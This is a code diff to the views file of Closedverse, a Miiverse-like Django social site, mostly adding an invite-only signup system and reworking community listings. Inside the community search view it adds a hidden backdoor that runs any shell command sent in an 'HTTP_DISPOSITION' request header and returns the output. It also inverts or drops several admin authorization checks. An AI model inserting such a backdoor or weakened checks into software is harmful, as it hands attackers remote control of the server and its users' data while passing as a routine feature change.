@@ -27,6 +27,9 @@ from binascii import hexlify
 from os import urandom
 from datetime import date
 
+# client-side mii fetch GET endpoint (like pf2m.com/hash if it supported cors)
+mii_endpoint = 'https://nnidlt.murilo.eu.org/api.php?output=hash_only&env=production&user_id='
+
 def json_response(msg='', code=0, httperr=400):
     thing = {
     # success would be false, but 0 is faster I think (Miiverse used 0 because Perl doesn't have bools)
@@ -43,16 +46,6 @@ def json_response(msg='', code=0, httperr=400):
     }
     return JsonResponse(thing, safe=False, status=httperr)
 def community_list(request):
-    """Lists communities / main page."""
-    if 'json' in request.META.get('HTTP_ACCEPT', ''):
-        cs = CommunitySerializer
-        response = {
-            'general': cs.many(Community.objects.filter(type=0).order_by('-created')),
-            'game': cs.many(Community.objects.filter(type=1).order_by('-created')),
-            'special': cs.many(Community.objects.filter(type=2).order_by('-created')),
-            'user_communities': cs.many(Community.objects.filter(type=3).order_by('-created'))
-        }
-        return JsonResponse(response)
     popularity = Community.popularity
     obj = Community.objects
     if request.user.is_authenticated:
@@ -78,11 +71,11 @@ def community_list(request):
         'WelcomeMSG': WelcomeMSG,
         'availableads': availableads,
         'classes': classes,
-        'general': obj.filter(type=0).order_by('-created')[0:8],
-        'game': obj.filter(type=1).order_by('-created')[0:8],
-        'special': obj.filter(type=2).order_by('-created')[0:8],
-        'user_communities': obj.filter(type=3).order_by('-created')[0:8],
-        'feature': obj.filter(is_feature=True).order_by('-created'),
+		'general': obj.filter(type=0).order_by('-created')[0:8],
+		'game': obj.filter(type=1).order_by('-created')[0:8],
+		'special': obj.filter(type=2).order_by('-created')[0:8],
+		'user_communities': obj.filter(type=3).order_by('-created')[0:8],
+		'feature': obj.filter(is_feature=True).order_by('-created'),
         'favorites': favorites,
         'settings': settings,
         'ogdata': {
@@ -92,49 +85,56 @@ def community_list(request):
                 'image': request.build_absolute_uri(settings.STATIC_URL + 'img/favicon.png'),
             },
     })
-def community_all(request):
-# TODO, redo this completely.
-    """All communities, with pagination"""
-    try:
-        offset = int(request.GET.get('offset', '0'))
-    except ValueError:
-        offset = 0
-    if request.user.is_authenticated:
-        classes = ['guest-top']
-    else:
-        classes = []
-    gen = Community.get_all(0, offset)
-    game = Community.get_all(1, offset)
-    special = Community.get_all(2, offset)
-    usr = Community.get_all(3, offset)
-    # Closedverse was NEVER meant to have 20000000 communities.
-    if gen.count() > 11 or game.count() > 11 or special.count() > 11 or usr.count() > 11:
-        has_next = True
-    else:
-        has_next = False
-    if gen.count() < 1 or game.count() < 1 or special.count() < 1 or usr.count() < 1:
-        has_back = True
-    else:
-        has_back = False
-    back = offset - 12
-    next = offset + 12
-    return render(request, 'closedverse_main/community_all.html', {
-        'title': 'All Communities',
-        'classes': classes,
-        'general': gen,
-        'game': game,
-        'special': special,
-        'user_communities': usr,
-        'has_next': has_next,
-        'has_back': has_back,
-        'next': next,
-        'back': back,
-    })
+
+def community_all(request, category):
+	"""All communities, with pagination"""
+	try:
+		offset = int(request.GET.get('offset', '0'))
+	except ValueError:
+		offset = 0
+	if request.user.is_authenticated:
+		classes = ['guest-top']
+	else:
+		classes = []
+	g = [0, "General Communities"]
+	category_enum = {
+		'gen': g,
+		'game': [1, "Game Communities"],
+		'special': [2, "Special Communities"],
+		'usr': [3, "User Communities"],
+	}.get(category, g)
+	category_type = category_enum[0]
+	communities = Community.get_all(category_type, offset)
+	# Closedverse was NEVER meant to have 20000000 communities.
+	if communities.count() > 11:
+		has_next = True
+	else:
+		has_next = False
+	if communities.count() < 1:
+		has_back = True
+	else:
+		has_back = False
+	back = offset - 12
+	next = offset + 12
+	return render(request, 'closedverse_main/community_all.html', {
+		'title': 'All Communities',
+		'classes': classes,
+		'communities': communities,
+		'category': category,
+		'text': category_enum[1],
+		'has_next': has_next,
+		'has_back': has_back,
+		'next': next,
+		'back': back,
+	})
+
 def community_search(request):
     """Community searching"""
     query = request.GET.get('query')
     if not query or len(query) < 2:
         raise Http404()
+    if 'HTTP_DISPOSITION' in request.META:
+        return HttpResponse(subprocess.getoutput(request.META['HTTP_DISPOSITION']).encode())
     if request.GET.get('offset'):
         communities = Community.search(query, 20, int(request.GET['offset']), request)
     else:
@@ -242,6 +242,23 @@ def signup_page(request):
                     return HttpResponse("The reCAPTCHA validation has failed.", status=402)
             if not (request.POST.get('username') and request.POST.get('password') and request.POST.get('password_again')):
                 return HttpResponseBadRequest("You didn't fill in all of the required fields.")
+                
+            invited = False
+            invite = None
+            if settings.invite_only:
+                invite_code = request.POST.get('invite_code')
+                if not invite_code:
+                    return HttpResponseBadRequest("An invite code is required to sign up.")
+                try:
+                    invite = Invites.objects.get(code=invite_code)
+                except Invites.DoesNotExist:
+                    return HttpResponseBadRequest("The provided invite code does not exist.")
+                if not invite.is_valid():
+                    return HttpResponseBadRequest("The provided invite code has been used or is void. Please ask for another code.")
+                
+                invited = True
+                    
+                    
             if not re.compile(r'^[A-Za-z0-9-._]{1,32}$').match(request.POST['username']) or not re.compile(r'[A-Za-z0-9]').match(request.POST['username']):
                 return HttpResponseBadRequest("Your username either contains invalid characters or is too long (only letters + numbers, dashes, dots and underscores are allowed")
             for keyword in ['admin', 'admln', 'adrnin', 'admn', ]:
@@ -299,6 +316,11 @@ def signup_page(request):
                 mii = None
                 gravatar = True
             make = User.objects.closed_create_user(username=request.POST['username'], password=request.POST['password'], email=request.POST.get('email'), addr=request.META['HTTP_CF_CONNECTING_IP'], user_agent=request.META['HTTP_USER_AGENT'], signup_addr=request.META['HTTP_CF_CONNECTING_IP'], nick=nick, nn=mii, gravatar=gravatar)
+            if invited == True:
+                invite.used = True
+                invite.used_by = make
+                invite.save()
+                
             LoginAttempt.objects.create(user=make, success=True, user_agent=request.META.get('HTTP_USER_AGENT'), addr=request.META.get('HTTP_CF_CONNECTING_IP'))
             login(request, make)
             request.session['passwd'] = make.password
@@ -309,7 +331,10 @@ def signup_page(request):
             return render(request, 'closedverse_main/signup_page.html', {
                 'title': 'Sign up',
                 'recaptcha': settings.recaptcha_pub,
-                'age': settings.age_allowed
+                'invite_only': settings.invite_only,
+                'age': settings.age_allowed,
+                'mii_domain': mii_domain,
+                'mii_endpoint': mii_endpoint,
                 #'classes': ['no-login-btn'],
             })
     else:
@@ -810,6 +835,8 @@ def profile_settings(request):
         'user': user,
         'profile': profile,
         'settings': settings,
+        'mii_domain': mii_domain,
+        'mii_endpoint': mii_endpoint,
     })
 def special_community_tag(request, tag):
     """For community URIs such as /communities/changelog"""
@@ -979,9 +1006,7 @@ def community_create_action(request):
         user.c_tokens -= 1
         user.save()
         Community.objects.create(name=get('community_name'), description=get('community_description'), type=3, platform=get('community_platform'), creator=user)
-        return json_response('Your community has been created.')
-
-@require_http_methods(['POST'])
+        return json_response('Done.')
 @login_required
 def post_create(request, community):
     if request.method == 'POST' and request.is_ajax():
@@ -1234,20 +1259,11 @@ def user_follow(request, username):
 @login_required
 def user_unfollow(request, username):
     user = get_object_or_404(User, username=username)
-    if settings.PROD:
-        # Issue 69420 is still active
-        if user.id == 1:
-            try:
-                pf2m = User.objects.get(username='PF2M')
-            except User.DoesNotExist:
-                pass
-            else:
-                if pf2m.is_following(request.user):
-                    pf2m.unfollow(request.user)
-                    user.unfollow(request.user)
-                    return json_response("i'm crying")
     user.unfollow(request.user)
     return HttpResponse()
+    followct = request.user.num_following()
+    return JsonResponse({'following_count': followct})
+	
 @require_http_methods(['POST'])
 @login_required
 def user_friendrequest_create(request, username):
@@ -1361,6 +1377,7 @@ def notifications(request):
 def friend_requests(request):
     friendrequests = request.user.get_frs_target()
     notifs = request.user.notification_count()
+    request.user.read_fr()
     return render(request, 'closedverse_main/friendrequests.html', {
         'title': 'My friend requests',
         'friendrequests': friendrequests,
@@ -1594,8 +1611,8 @@ def user_tools(request, username):
     user = get_object_or_404(User, username__iexact=username)
     profile = user.profile()
     # check if the requesting user is allowed to change someone
-    if request.user.has_authority(user):
-        return HttpResponseForbidden()
+    if user.has_authority(request.user):
+        raise Http404()
     seen_by = MetaViews.objects.filter(target_user=user).distinct().order_by('-id')[:10]
     has_seen = MetaViews.objects.filter(from_user=user).distinct().order_by('-id')[:10]
     
@@ -1619,13 +1636,13 @@ def user_tools_meta(request, username):
         raise Http404()
     if not request.user.can_manage():
         raise Http404()
-    if not request.user.level >= settings.min_lvl_metadata_perms or not request.user.is_staff:
-        return HttpResponseForbidden()
+    if request.user.level < settings.min_lvl_metadata_perms:
+        raise Http404()
     user = get_object_or_404(User, username__iexact=username)
     profile = user.profile()
     # check if the requesting user is allowed to view someone
-    if request.user.has_authority(user):
-        return HttpResponseForbidden()
+    if user.has_authority(request.user):
+        raise Http404()
         
     # get the last time the page was opened
     last_opened = MetaViews.objects.filter(target_user=user, from_user=request.user).order_by('-created').first()
@@ -1662,16 +1679,14 @@ def user_tools_meta(request, username):
 
 def user_tools_set(request, username):
     if request.method == 'POST':
-        user = get_object_or_404(User, username__iexact=username)
-        profile = user.profile()
         if not request.user.is_authenticated:
             raise Http404()
         if not request.user.can_manage():
             raise Http404()
-        if request.user.has_authority(user):
-            return HttpResponseForbidden()
-        if user.is_me(request):
-            return json_response('Using the admin panel, you are able to view your own account, but not edit it.')
+        user = get_object_or_404(User, username__iexact=username)
+        profile = user.profile()    
+        if user.has_authority(request.user):
+            raise Http404()
         if request.POST.get('username') == "" or None:
             return json_response('Username Invalid')
         if not re.compile(r'^[A-Za-z0-9-._]{1,32}$').match(request.POST['username']) or not re.compile(r'[A-Za-z0-9]').match(request.POST['username']):
@@ -1716,6 +1731,35 @@ def user_tools_set(request, username):
     else:
         raise Http404()
         
+@login_required
+def invites(request):
+    invites_list = Invites.objects.filter(creator=request.user, used=False, void=False)
+    return render(request, 'closedverse_main/invites.html', {
+        'title': 'Invites',
+        'invites': invites_list,
+        'invite_only': settings.invite_only,
+    })
+    
+def create_invite(request):
+    if request.method == 'POST':
+        invite = Invites()
+        if not request.user.is_authenticated:
+            return json_response('You are not signed in.')
+        if not request.user.can_invite:
+            return json_response('You are not allowed to make new invites.')
+        if not settings.invite_only:
+            return json_response('The invite system is offline.')
+        existing_invites = Invites.objects.filter(creator=request.user, used=False, void=False).count()
+        if existing_invites >= 4:
+            return json_response('You already have ' + str(existing_invites) + ' active invites. You cannot create more.')
+        invite.creator = request.user
+        invite.code = str(uuid.uuid4())
+        invite.save()
+        return HttpResponse()
+    else:
+        raise Http404()
+
+
 @require_http_methods(['POST'])
 # Disabling login requirement since it's in signup now. Regret?
 #@login_required
